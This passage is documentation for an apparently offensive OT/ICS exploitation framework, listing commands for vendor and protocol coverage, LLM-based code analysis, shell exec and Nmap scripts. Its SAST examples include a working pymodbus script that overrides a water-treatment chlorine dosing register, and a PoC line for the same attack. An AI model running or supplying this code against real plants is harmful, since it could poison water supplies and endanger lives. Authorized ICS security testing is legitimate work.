  PyPI: pip install industrialxpl-forge
  GitHub: https://github.com/mrhenrike/IndustrialXPL-Forge
```

**Related commands:** `vendors`, `protocols`, `coverage`, `mitre-coverage`

---

### `vendors [filter]`

List all 150 covered OT/ICS vendors with CVE module counts. Optional substring filter.

**Syntax:** `vendors [substring_filter]`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| filter | string | no | — (all) | Any substring | Case-insensitive substring match on vendor name |

**Example 1 — List all vendors (abbreviated):**

```
ixf > vendors
  Vendors (150 covered)
  ───────────────────────────────────────────────────────────────
  Vendor                          CVE Modules   Cred Modules
  Schneider Electric                   39            3
  Rockwell Automation                  38            2
  Siemens                              27            3
  ABB                                  22            2
  Honeywell                            20            2
  GE / GE Vernova                      18            1
  Emerson                              16            1
  AVEVA / OSIsoft                      14            1
  Advantech                            15            1
  Moxa                                 12            3
  Omron                                12            3
  Phoenix Contact                       9            3
  Beckhoff                              8            1
  Yokogawa                              5            1
  Mitsubishi Electric                   8            1
  Pilz                                  4            1
  WAGO                                  4            1
  Inductive Automation (Ignition)       6            1
  Tridium (Niagara)                     7            1
  Unitronics                            5            1
  ...                                 ...          ...
  [150 vendors total]
  ───────────────────────────────────────────────────────────────
[i] Filter: vendors <term>  (e.g. vendors japan)
```

**Example 2 — Filter by vendor name:**

```
ixf > vendors siemens
  Vendors (1 result)
  ───────────────────────────────────────────────────────────────
  Vendor                          CVE Modules   Cred Modules
  Siemens                              27            3
  ───────────────────────────────────────────────────────────────
[i] Key CVEs: CVE-2021-22681 (CRITICAL), CVE-2022-38465 (CRITICAL), CVE-2019-13945 (HIGH)
[i] Load: use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
```

**Example 3 — Filter by region:**

```
ixf > vendors japan
  Vendors (7 results)
  ───────────────────────────────────────────────────────────────
  Vendor                          CVE Modules   Cred Modules
  Omron                                12            3
  Mitsubishi Electric                   8            1
  Yokogawa                              5            1
  Keyence                               2            0
  FANUC                                 2            0
  Panasonic                             1            0
  Fuji Electric                         2            1
  ───────────────────────────────────────────────────────────────
```

**Example 4 — Filter by country:**

```
ixf > vendors germany
  Vendors (8 results)
  ───────────────────────────────────────────────────────────────
  Siemens, Beckhoff, WAGO, Pilz, Bihl+Wiedemann, Lenze, Phoenix Contact, SEW-Eurodrive
```

**Example 5 — Filter by protocol/product:**

```
ixf > vendors scada
  Vendors (5 results)
  ───────────────────────────────────────────────────────────────
  Inductive Automation (Ignition SCADA)    6 CVE modules
  AVEVA (InTouch/Wonderware SCADA)        14 CVE modules
  Iconics (Genesis64 SCADA)                4 CVE modules
  GE (iFIX/CIMPLICITY SCADA)              18 CVE modules
  Measuresoft (SCADA)                      2 CVE modules
```

**Error scenario — No matches:**

```
ixf > vendors nonexistentvendor
[*] No vendors matching: 'nonexistentvendor'
[i] Use 'vendors' without arguments to list all 150 vendors.
```

**Related commands:** `stats`, `protocols`, `search`

---

### `protocols`

List all 50 covered OT/ICS protocols with exploit module counts and default ports.

**Syntax:** `protocols`

**Context:** global

**Parameters:** none

**Example 1 — Protocol list:**

```
ixf > protocols
  Protocol Coverage (50 protocols)
  ───────────────────────────────────────────────────────────────────────────
  Protocol                 Port(s)        Modules   Module Path
  MODBUS TCP               502 TCP        18        exploits/protocols/modbus/
  Siemens S7comm           102 TCP        8         exploits/protocols/s7comm/
  Siemens S7comm+          102 TCP        5         exploits/protocols/s7comm_plus/
  EtherNet/IP (CIP)        44818 TCP      7         exploits/protocols/enip/
  PROFINET DCP             Broadcast L2   3         exploits/protocols/profinet/
  DNP3                     20000 TCP/UDP  4         exploits/protocols/dnp3/
  BACnet/IP                47808 UDP      2         exploits/protocols/bacnet/
  IEC 60870-5-104          2404 TCP       3         exploits/protocols/iec104/
  IEC 61850 MMS            102 TCP        3         exploits/protocols/iec61850/
  IEC 61850 GOOSE          L2 multicast   2         exploits/protocols/iec61850/
  OPC UA                   4840 TCP       4         exploits/protocols/opcua/
  OPC DA (DCOM)            135 TCP        2         exploits/protocols/opc_da/
  Omron FINS               9600 UDP       3         exploits/protocols/fins/
  Unitronics PCOM          20256 TCP      2         exploits/protocols/pcom/
  Beckhoff ADS/AMS         48898 TCP      2         exploits/protocols/ads/
  MQTT                     1883 TCP       2         exploits/protocols/mqtt/
  SNMP                     161 UDP        3         exploits/protocols/snmp/
  PROFIBUS DP              1962 (gw)      2         exploits/protocols/profibus/
  HART / HART-IP           5094 TCP       1         exploits/protocols/hart/
  CANopen                  4001 (gw)      1         exploits/protocols/canopen/
  CC-Link                  61450 UDP      2         exploits/protocols/cc_link/
  CC-Link IE Field         61450 UDP      1         exploits/protocols/cc_link_ie_field/
  EtherCAT                 L2             1         exploits/protocols/ethercat/
  SERCOS III               8008 TCP       1         exploits/protocols/sercos/
  LonWorks/LonTalk         1628 UDP       1         exploits/protocols/lonworks/
  KNX/EIB                  3671 UDP       1         exploits/protocols/knx/
  ControlNet               44818 TCP      1         exploits/protocols/controlnet/
  DeviceNet                44818 TCP      1         exploits/protocols/devicenet/
  PCCC (Allen-Bradley)     44818 TCP      1         exploits/protocols/pccc/
  FL-NET (OPCN-2)          7000 UDP       1         exploits/protocols/fl_net/
  Yokogawa Vnet/IP         20111 TCP      1         exploits/protocols/vnetip/
  FOUNDATION Fieldbus HSE  1089 TCP       1         exploits/protocols/foundation_fieldbus/
  CIP Safety               44818 TCP      1         exploits/protocols/ethernet_ip_cip_safety/
  PROFIsafe                502 TCP        1         exploits/protocols/profisafe/
  FSoE (Beckhoff TwinSAFE) L2             1         exploits/protocols/fsoe/
  SECS/GEM (HSMS)          5000 TCP       1         exploits/protocols/hsms/
  Serial-to-Ethernet       4001 TCP       2         exploits/protocols/serial/
  Modbus RTU               Serial/GW      3         exploits/protocols/modbus/
  PROFIBUS PA              1962 (gw)      1         exploits/protocols/profibus_pa/
  IO-Link                  —              1         exploits/protocols/iolink/
  INTERBUS                 1962 (gw)      1         exploits/protocols/interbus/
  CompoNet                 9600 (gw)      1         exploits/protocols/componet/
  EtherNet/POWERLINK       L2             1         exploits/protocols/powerlink/
  OPC HDA                  135 TCP        1         exploits/protocols/opc_hda/
  OPC A&E                  135 TCP        1         exploits/protocols/opc_ae/
  BACnet/MSTP              Serial/GW      1         exploits/protocols/bacnet_mstp/
  DNP3 Security Auth v5    20000 TCP      1         assessment/protocols/dnp3_security_audit
  OPC UA Security          4840 TCP       1         assessment/protocols/opcua_security_audit
  IEC 61850 Security       102 TCP        1         assessment/protocols/iec61850_security_audit
  SNMP OT                  161 UDP        1         exploits/protocols/snmp/
  ───────────────────────────────────────────────────────────────────────────
  TOTAL: 50 protocols | 103 exploit modules
```

**Related commands:** `vendors`, `search`, `stats`

---

### `coverage`

Alias for `mitre-coverage`. See [`mitre-coverage`](#mitre-coverage) for full documentation.

**Syntax:** `coverage`

**Example:**

```
ixf > coverage
[i] Alias for: mitre-coverage
  MITRE ATT&CK for ICS Coverage
  ...
```

---

## LLM / SAST

### `llm-key <provider> <api_key>`

Configure an LLM provider API key for SAST analysis. Keys are stored in-session only and never written to disk by this command.

**Syntax:** `llm-key <provider> <api_key>`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| provider | string | yes | — | `openai`, `anthropic`, `gemini`, `deepseek`, `grok` | Exact match |
| api_key | string | yes | — | Provider-specific API key string | Length > 0; stored in memory only |

**Example 1 — Configure Gemini:**

```
ixf > llm-key gemini AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[+] LLM key configured: provider=gemini len=39
[i] Key is stored in-session only. Set GOOGLE_AI_STUDIO_API_KEY env var to persist.
```

**Example 2 — Configure OpenAI:**

```
ixf > llm-key openai sk-svcacct-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn
[+] LLM key configured: provider=openai len=71
```

**Example 3 — Configure Anthropic:**

```
ixf > llm-key anthropic sk-ant-api03-XXXXXXXXXXXXXXXXXXXXX
[+] LLM key configured: provider=anthropic len=40
```

**Example 4 — Configure DeepSeek:**

```
ixf > llm-key deepseek sk-deepseek-XXXXXXXXXXXXXXXXXXXXXXXXXX
[+] LLM key configured: provider=deepseek len=37
```

**Example 5 — Configure Grok (xAI):**

```
ixf > llm-key grok xai-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[+] LLM key configured: provider=grok len=50
```

**Error scenario — Invalid provider:**

```
ixf > llm-key mistral sk-xxx
[-] Unknown provider: 'mistral'
[i] Valid providers: openai, anthropic, gemini, deepseek, grok
```

**Error scenario — Missing arguments:**

```
ixf > llm-key openai
[-] Usage: llm-key <provider> <api_key>
    Example: llm-key gemini AIzaSy...
```

**Related commands:** `llm-status`, `sast`

---

### `llm-status`

Display the configuration status of all LLM providers. Shows which providers are configured (key present) and which is active.

**Syntax:** `llm-status`

**Context:** global

**Parameters:** none

**Example 1 — Only Gemini configured:**

```
ixf > llm-status

  LLM Provider Status
  ──────────────────────────────────────────────────────
  Provider      Status           Source
  openai        not configured   (set OPENAI_API_KEY or use llm-key openai)
  anthropic     not configured   (set ANTHROPIC_API_KEY or use llm-key anthropic)
  gemini        configured       (GOOGLE_AI_STUDIO_API_KEY env var)
  deepseek      not configured   (set DEEPSEEK_API_KEY or use llm-key deepseek)
  grok          not configured   (set XAI_API_KEY or use llm-key grok)
  ──────────────────────────────────────────────────────
  Active provider: gemini (gemini-2.5-flash)
  [i] Provider selection: OpenAI → Anthropic → Gemini → DeepSeek → Grok
```

**Example 2 — Multiple configured (OpenAI takes priority):**

```
ixf > llm-status

  LLM Provider Status
  ──────────────────────────────────────────────────────
  Provider      Status           Model
  openai        configured       gpt-4o
  anthropic     not configured
  gemini        configured       gemini-2.5-flash
  deepseek      not configured
  grok          not configured
  ──────────────────────────────────────────────────────
  Active provider: openai (gpt-4o)   [highest priority]
```

**Example 3 — None configured:**

```
ixf > llm-status

  LLM Provider Status
  ──────────────────────────────────────────────────────
  openai        not configured
  anthropic     not configured
  gemini        not configured
  deepseek      not configured
  grok          not configured
  ──────────────────────────────────────────────────────
  Active provider: none
  [-] No LLM provider configured. SAST commands will fail.
  [i] Set an API key: llm-key gemini AIzaSy...
  [i] Or: export GOOGLE_AI_STUDIO_API_KEY=AIzaSy...
```

**Related commands:** `llm-key`, `sast`

---

### `sast <path> [--mode <mode>] [--diff <other_path>]`

Run offline LLM-powered SAST analysis on PLC/RTU source code. Code is sanitized before sending to the LLM (credentials, IPs removed). Analysis results are displayed in the terminal and optionally saved.

**Syntax:** `sast <path> [--mode sast|reverse|diff|exploit-gen] [--diff <other_file>]`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| path | string | yes | — | Path to PLC source file or project directory | Must exist on filesystem |
| `--mode` | string | no | `sast` | `sast`, `reverse`, `diff`, `exploit-gen` | Case-insensitive |
| `--diff` | string | no | — | Second file/path for diff mode | Must exist; only valid with `--mode diff` |

**Supported file extensions:** `.st`, `.fbd`, `.ladder`, `.il`, `.sfc`, `.cfc`, `.xml`, `.aml`, `.py`, `.c`, `.cpp`, `.go`, `.js`, `.rb`, `.pl`, `.java`

**Analysis modes:**

| Mode | Description |
|------|-------------|
| `sast` | Full vulnerability analysis — setpoints, safety, authentication, network, logic flaws |
| `reverse` | Reverse engineer binary/compiled PLC firmware or opaque code |
| `diff` | Compare two versions of PLC code for unauthorized changes |
| `exploit-gen` | Generate proof-of-concept exploit based on SAST findings |

**Example 1 — SAST mode on directory:**

```
ixf > sast /opt/plc_projects/water_treatment/ --mode sast
[*] Target: /opt/plc_projects/water_treatment/ (5 files, 245 lines)
[*] Languages: ST (3 files), FBD (1 file), IL (1 file)
[*] Provider: gemini (gemini-2.5-flash)
[*] Sanitizing code... Removed: 2 credential(s), 1 public IP
[*] Token count: 9.7 KB (within budget: 128K)
[*] Sending sanitized code to LLM...

  SAST VULNERABILITY ANALYSIS REPORT
  ═══════════════════════════════════════════════════════════════

  FINDING [SEVERITY: CRITICAL]: Unvalidated Chlorine Dosing Setpoint
    Location: water_treatment.st, line 48
    Type:     Input Validation Flaw / Unsafe Setpoint
    Code:     SP_CHLORINE_HIGH := 4000.0;  (* TODO: add validation *)
    Attack Vector: Modbus FC16 write to HR[200] (DOSE_FACTOR) — no authentication
    Physical Impact: 4000 mg/L chlorine — 2000x WHO safe limit (2.0 mg/L)
                     Lethal dose for infants; mass casualty potential
    MITRE ATT&CK for ICS: T0836 (Modify Parameter), T0880 (Alarm Suppression)
    Remediation: Validate DOSE_FACTOR := MIN(DOSE_FACTOR, 2.0);
                 Add hardware interlock independent of PLC logic
    PoC: modbus_write_register(unit=1, address=200, value=65535)  # 4000+ mg/L

  FINDING [SEVERITY: HIGH]: Race Condition in pH Dosing
    Location: water_treatment.st, lines 65-71
    Type:     Logic Race Condition
    Description: ACID_PUMP and BASE_PUMP can both activate simultaneously
                 if pH sensor read and setpoint check happen in same PLC scan
    Physical Impact: Dangerous pH excursion (pH < 2 or pH > 12)
    MITRE: T0831 (Manipulation of Control), T0836 (Modify Parameter)
    Remediation: Add mutex locking — IF ACID_PUMP THEN BASE_PUMP := FALSE; END_IF

  FINDING [SEVERITY: HIGH]: Unauthenticated PLC Programming Interface
    Location: network_config.st, line 12
    Type:     Missing Authentication
    Description: PROGRAMMING_PORT := 502; (* No auth — dev mode left enabled *)
    Attack Vector: Any host on OT network can download new PLC program
    MITRE: T0843 (Program Download)
    Remediation: Disable programming port in production; require engineering station auth

  FINDING [SEVERITY: MEDIUM]: Hardcoded SCADA Credentials
    Location: historian_connector.st, line 8
    Type:     Hardcoded Credentials (SANITIZED in this report)
    Description: DB connection string contains hardcoded username/password
    Remediation: Use credential vault (e.g., CyberArk, HashiCorp Vault)

  FINDING [SEVERITY: LOW]: Missing Watchdog Timer
    Location: main.st, entire file
    Type:     Missing Safety Control
    Description: No watchdog timer detected — PLC could hang without recovery
    Remediation: Add WDT_Enable := TRUE; WDT_Timeout := 500; (* ms *)

  ═══════════════════════════════════════════════════════════════
  Summary: 5 findings (1 CRITICAL, 2 HIGH, 1 MEDIUM, 1 LOW)
  Report saved: .tmp/sast_results/water_treatment_report.md
```

**Example 2 — diff mode:**

```
ixf > sast /backup/plc_v1.st --mode diff --diff /current/plc_v2.st
[*] Diff analysis: /backup/plc_v1.st vs /current/plc_v2.st
[*] Provider: gemini
[*] Sending diff to LLM...

  PLC CODE DIFF SECURITY ANALYSIS
  ═══════════════════════════════════════════════════════════════

  UNAUTHORIZED CHANGE DETECTED [SEVERITY: CRITICAL]
    Lines Changed: 47-53 (v1) → 47-56 (v2)
    Original (v1):
      IF PRESSURE > MAX_PRESSURE THEN
        SAFETY_VALVE := TRUE;
        ALARM := TRUE;
      END_IF
    Modified (v2):
      IF PRESSURE > MAX_PRESSURE THEN
        (* SAFETY_VALVE := TRUE; *)   (* valve disabled by attacker *)
        FAKE_PRESSURE := 45.0;        (* spoofed sensor reading *)
        ALARM := FALSE;               (* alarms suppressed *)
      END_IF
    Assessment: Classic Industroyer/Triton-style safety system bypass
    MITRE: T0838 (Modify Alarm Settings), T0836 (Modify Parameter), T0829 (Loss of Protection)
    Action: IMMEDIATE rollback to v1; investigate how change was introduced
```

**Example 3 — exploit-gen mode:**

```
ixf > sast /opt/plc_projects/water_treatment/water_treatment.st --mode exploit-gen
[*] Analyzing for exploit generation...
[*] Provider: gemini
[*] Generating PoC based on SAST findings...

  EXPLOIT GENERATION REPORT
  ═══════════════════════════════════════════════════════════════

  Based on CRITICAL finding: Unvalidated Chlorine Dosing Setpoint (line 48)

  Generated Python PoC:
  ─────────────────────────────────────────────────────────────
  from pymodbus.client import ModbusTcpClient

  TARGET = "192.168.1.100"
  PORT = 502
  DOSE_REGISTER = 200  # HR[200] = DOSE_FACTOR
  ATTACK_VALUE = 65535  # Maximum value → ~4000 mg/L chlorine

  client = ModbusTcpClient(TARGET, port=PORT)
  client.connect()
  # Write maximum dosing factor to override operator setpoint
  client.write_registers(address=DOSE_REGISTER, values=[ATTACK_VALUE], unit=1)
  client.close()
  print(f"[+] DOSE_FACTOR set to {ATTACK_VALUE} on {TARGET}:{PORT}")
  ─────────────────────────────────────────────────────────────
  [!] This PoC is generated for authorized security testing only.
  [i] MITRE: T0836 (Modify Parameter) | Physical Impact: CATASTROPHIC
```

**Error scenario — LLM not configured:**

```
ixf > sast /opt/plc.st
[-] No LLM provider configured.
[i] Configure a provider: llm-key gemini AIzaSy...
[i] Or: export GOOGLE_AI_STUDIO_API_KEY=AIzaSy...
```

**Error scenario — File not found:**

```
ixf > sast /nonexistent/path.st
[-] File not found: /nonexistent/path.st
```

**Related commands:** `llm-key`, `llm-status`

---

## Utility

### `exec <shell_command>`

Execute an arbitrary shell command and display output. Timeout: 30 seconds. For quick system checks, pinging targets, or running external tools without leaving IXF.

**Syntax:** `exec <command>`

**Context:** global or module

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| command | string | yes | — | Any shell command string | Parsed with shlex; 30-second timeout |

**Example 1 — Ping a target:**

```
ixf > exec ping 192.168.1.100 -c 3
PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.
64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=0.487 ms
64 bytes from 192.168.1.100: icmp_seq=2 ttl=64 time=0.512 ms
64 bytes from 192.168.1.100: icmp_seq=3 ttl=64 time=0.498 ms
--- 192.168.1.100 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
```

**Example 2 — Run env doctor:**

```
ixf > exec python tools/env_doctor.py
[IXF Environment Doctor]
  Python         : OK (3.13.2)
  pymodbus       : OK (3.7.0)
  scapy          : OK (2.5.0)
  opcua/asyncua  : OK (1.0.6)
  gcc            : OK
  go             : OK (1.22.3)
  Nmap           : OK (7.95)
  ...
```

**Example 3 — nmap scan from within IXF:**

```
ixf > exec nmap -sV -p 102,502,47808,4840,20000 192.168.1.100
Starting Nmap 7.95 ( https://nmap.org )
PORT      STATE SERVICE     VERSION
102/tcp   open  iso-tsap    Siemens S7 PLC (Step 7 TIA)
502/tcp   open  modbus      Modbus/TCP
4840/tcp  closed opc-ua
20000/tcp closed dnp3
47808/udp open  bacnet
```

**Error scenario — Command not found:**

```
ixf > exec nonexistentcommand
[-] exec error: [Errno 2] No such file or directory: 'nonexistentcommand'
```

**Error scenario — Timeout:**

```
ixf > exec sleep 60
[-] exec timeout: command exceeded 30 seconds
```

**Related commands:** `discover`, `sast`

---

## NSE Scripts

### `nse [install|list|status] [--force]`

Manage IXF Nmap NSE scripts. Install ICS/OT-specific scripts into the Nmap scripts directory, list available scripts, or show installation status.

**Syntax:** `nse [install|list|status] [--force]`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| subcommand | string | no | `status` | `install`, `list`, `status` | Case-insensitive |
| `--force` | flag | no | — | Overwrite existing scripts (only with `install`) | N/A |

| Subcommand | Description |
|------------|-------------|
| `install` | Copy IXF NSE scripts into Nmap scripts directory; run `--script-updatedb` |
| `install --force` | Overwrite even if scripts already exist |
| `list` | List NSE scripts bundled with IXF (from `resources/nse_scripts/`) |
| `status` | Show Nmap detection, scripts directory, and installation status |

**Example 1 — `nse status` (Nmap installed, scripts not yet installed):**

```
ixf > nse status
[*] [NSE] IndustrialXPL-Forge Nmap Script Status
[i] IXF NSE scripts available : 8
[i] IXF NSE scripts path      : /opt/ixf/industrialxpl/resources/nse_scripts/

[+] Nmap binary : /usr/bin/nmap
[+] Version     : Nmap version 7.95 ( https://nmap.org )
[+] Scripts dir : /usr/share/nmap/scripts

[i] IXF scripts installed : 0/8

  IXF NSE Scripts for OT/ICS
  ┌─────────────────────────────────┬───────────────┐
  │ Script                          │ Status        │
  ├─────────────────────────────────┼───────────────┤
  │ ics-sweep.nse                   │ not installed │
  │ ics-default-creds.nse           │ not installed │
  │ ics-plc-program-access.nse      │ not installed │
  │ ics-safety-systems.nse          │ not installed │
  │ ics-firmware-version.nse        │ not installed │
  │ ics-historian-discover.nse      │ not installed │
  │ ics-enumerate.nse               │ not installed │
  │ ics-honeypot-detect.nse         │ not installed │
  └─────────────────────────────────┴───────────────┘

[!] 8 script(s) not yet installed.
    Run: ixf > nse install
```

**Example 2 — `nse install` (successful):**

```
ixf > nse install
[*] Installing IXF NSE scripts into /usr/share/nmap/scripts/...
[+] ics-sweep.nse                   → installed
[+] ics-default-creds.nse           → installed
[+] ics-plc-program-access.nse      → installed
[+] ics-safety-systems.nse          → installed
[+] ics-firmware-version.nse        → installed
[+] ics-historian-discover.nse      → installed
[+] ics-enumerate.nse               → installed
[+] ics-honeypot-detect.nse         → installed
[*] Running: nmap --script-updatedb
[+] NSE script database updated.
[+] All 8 IXF NSE scripts installed successfully.
[i] Usage: nmap --script ics-sweep -p 102,502,47808 <target>
[i] For all ICS scripts: nmap --script "ics-*" -p 102,502,47808,4840,20000 <target>
```

**Example 3 — `nse install --force` (overwrite existing):**

```
ixf > nse install --force
[*] Force-installing IXF NSE scripts (overwrite mode)...
[+] ics-sweep.nse                   → overwritten
[+] ics-default-creds.nse           → overwritten
[+] ics-plc-program-access.nse      → overwritten
[+] ics-safety-systems.nse          → overwritten
[+] ics-firmware-version.nse        → overwritten
[+] ics-historian-discover.nse      → overwritten
[+] ics-enumerate.nse               → overwritten
[+] ics-honeypot-detect.nse         → overwritten
[*] Running: nmap --script-updatedb
[+] All 8 scripts force-reinstalled.
```

**Example 4 — `nse list`:**

```
ixf > nse list
[*] IXF NSE Scripts (8 scripts in resources/nse_scripts/)
  ─────────────────────────────────────────────────────────────────────
  Script                        Description
  ics-sweep.nse                 Multi-protocol ICS port sweep (Modbus, S7, EtherNet/IP, etc.)
  ics-default-creds.nse         Test default credentials on ICS web interfaces and SSH
  ics-plc-program-access.nse    Check if PLC programming port is unauthenticated
  ics-safety-systems.nse        Detect safety system (SIS/SIL) interfaces on the network
  ics-firmware-version.nse      Extract firmware version from OT devices
  ics-historian-discover.nse    Discover industrial historian databases on the network
  ics-enumerate.nse             Enumerate ICS device metadata (vendor, model, firmware)
  ics-honeypot-detect.nse       Detect ICS honeypots using response timing/content analysis
  ─────────────────────────────────────────────────────────────────────
[i] Install: nse install
[i] Use: nmap --script <script_name> <target>
```

**Example 5 — `nse status` (Nmap not installed):**

```
ixf > nse status
[*] [NSE] IndustrialXPL-Forge Nmap Script Status
[i] IXF NSE scripts available : 8
[i] IXF NSE scripts path      : /opt/ixf/industrialxpl/resources/nse_scripts/

[-] Nmap NOT installed — download from https://nmap.org/download

[!] Nmap not detected. Install Nmap to use these scripts.
    Scripts are stored in IXF at: /opt/ixf/industrialxpl/resources/nse_scripts/
    Once Nmap is installed, run: ixf > nse install
```

**Error scenario — Permission denied during install:**

```
ixf > nse install
[*] Installing IXF NSE scripts into /usr/share/nmap/scripts/...
[+] ics-sweep.nse                   → installed
[-] ics-default-creds.nse: PermissionError — run as administrator (Windows) or with sudo (Linux/macOS)
[-] ics-plc-program-access.nse: PermissionError — ...
[!] 2 script(s) failed to install due to permissions.
[i] Linux/macOS: sudo ixf nse install
[i] Windows:     Run terminal as Administrator, then: ixf nse install
```

**Error scenario — Nmap not found during install:**

```
ixf > nse install
[-] Nmap scripts directory not found.
    Install Nmap first: https://nmap.org/download
    After installing Nmap, run: ixf > nse install
```

**Related commands:** `exec`, `discover`

> For full NSE script reference including arguments and example Nmap output, see [Nmap NSE Scripts](14-nse-scripts.md).

---

## Command Quick Reference

All 36 IXF commands at a glance:

| Command | Category | Syntax | Context |
|---------|----------|--------|---------|
| `help` | Navigation | `help` | global/module |
| `exit` | Navigation | `exit` | global/module |
| `use` | Navigation | `use <module_path>` | global/module |
| `back` | Navigation | `back` | module |
| `set` | Options | `set <option> <value>` | module |
| `setg` | Options | `setg <option> <value>` | global/module |
| `unsetg` | Options | `unsetg <option>` | global/module |
| `show` | Inspection | `show [info\|options\|advanced\|devices\|all]` | module |
| `run` | Execution | `run` | module |
| `check` | Execution | `check` | module |
| `search` | Discovery | `search <term>` | global |
| `discover` | Discovery | `discover <CIDR>` | global |
| `cve` | CVE | `cve <CVE-ID>` | global |
| `cve-scan` | CVE | `cve-scan <CIDR>` | global |
| `report` | Reports | `report [json\|html\|markdown]` | global |
| `mitre` | MITRE | `mitre <TID>` | global |
| `mitre-list` | MITRE | `mitre-list [tactic]` | global |
| `mitre-scan` | MITRE | `mitre-scan <tactic\|TID> <target> [--destructive]` | global |
| `mitre-all` | MITRE | `mitre-all <target>` | global |
| `mitre-coverage` | MITRE | `mitre-coverage` | global |
| `mitre-report` | MITRE | `mitre-report [json\|html\|layer]` | global |
| `mitre-tactic` | MITRE | `mitre-tactic <tactic> <target>` | global |
| `ttp` | TTP | `ttp <TID> <target> [flags]` | global |
| `ttp-check` | TTP | `ttp-check <TID> <target>` | global |
| `ttp-simulate` | TTP | `ttp-simulate <TID> <target>` | global |
| `ttp-list` | TTP | `ttp-list [--tactic <name>]` | global |
| `assess` | Assessment | `assess <module_path>` | global |
| `stats` | Statistics | `stats` | global |
| `vendors` | Statistics | `vendors [filter]` | global |
| `protocols` | Statistics | `protocols` | global |
| `coverage` | Statistics | `coverage` (alias for mitre-coverage) | global |
| `llm-key` | LLM/SAST | `llm-key <provider> <api_key>` | global |
| `llm-status` | LLM/SAST | `llm-status` | global |
| `sast` | LLM/SAST | `sast <path> [--mode <mode>] [--diff <other>]` | global |
| `exec` | Utility | `exec <shell_command>` | global/module |
| `nse` | NSE | `nse [install\|list\|status] [--force]` | global |

---

## Global State Reference

| State | Default | Scope | Set With |
|-------|---------|-------|---------|
| `simulate` | `True` | per-module (overridable via `setg`) | `set simulate false` / `setg simulate false` |
| `destructive` | `False` | per-module (overridable via `setg`) | `set destructive true` |
| `target` | `""` | per-module (overridable via `setg`) | `set target <IP>` / `setg target <IP>` |
| `port` | module-specific | per-module | `set port <N>` |
| `timeout` | `10` | per-module (overridable via `setg`) | `set timeout <N>` |
| `verbose` | `False` | per-module (overridable via `setg`) | `set verbose true` |
| history file | `~/.ixf_history` | session | `readline` auto |
| audit log | `.log/destructive_ops_YYYY-MM-DD.log` | session | auto on destructive action |

---

## Error Reference

| Error Message | Cause | Fix |
|---------------|-------|-----|
| `No module loaded. Use 'use <module>' first.` | Command requires a loaded module | Run `use <path>` |
| `Required option 'target' not set.` | Required option missing | Run `set target <IP>` |
| `Module not found: <path>` | Invalid module path | Run `search <term>` |
| `Unknown command: '<cmd>'` | Typo or unsupported command | Run `help` |
| `Validation error for '<option>': <reason>` | Invalid option value | Check valid range/type |
| `No LLM provider configured.` | SAST without API key | Run `llm-key <provider> <key>` |
| `File not found: <path>` | SAST path invalid | Check path exists |
| `PermissionError — run as administrator` | NSE install without sudo/admin | Rerun with `sudo` |
| `Nmap scripts directory not found.` | Nmap not installed | Install Nmap first |
| `exec timeout: command exceeded 30 seconds` | Long-running `exec` command | Use shell directly for long commands |

---

*Previous: [Quick Start](02-quick-start.md) | Next: [Module System](04-module-system.md)*
